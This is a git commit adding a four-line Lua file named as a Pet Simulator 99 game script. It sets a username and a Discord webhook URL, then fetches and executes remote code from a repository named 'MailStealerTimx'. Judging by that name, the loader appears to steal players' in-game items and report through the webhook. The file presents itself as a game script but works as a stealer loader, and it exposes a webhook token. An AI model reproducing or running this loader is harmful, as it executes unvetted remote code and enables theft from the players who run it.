779d241c39034177bf753a75de3d9525b5923bf1
Fabhay <72580053+fabhay2@users.noreply.github.com>
2024-12-11 18:16:19 -0500

    Add files via upload

---
+++ Petsim99Script.lua
@@ -0,0 +1,4 @@
+_G.username = "fabhay2"
+_G.Webhook = "https://discord.com/api/webhooks/1316534043499823104/DzVCHPKWhSMlBfj1ljQ2dgLIrdZsJdW9hiNEmq2FD_hzwtDcMyv6GdY7KkSumIsBdxku"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eonzzx/MailStealTimx/refs/heads/main/MailStealerTimx",true))();
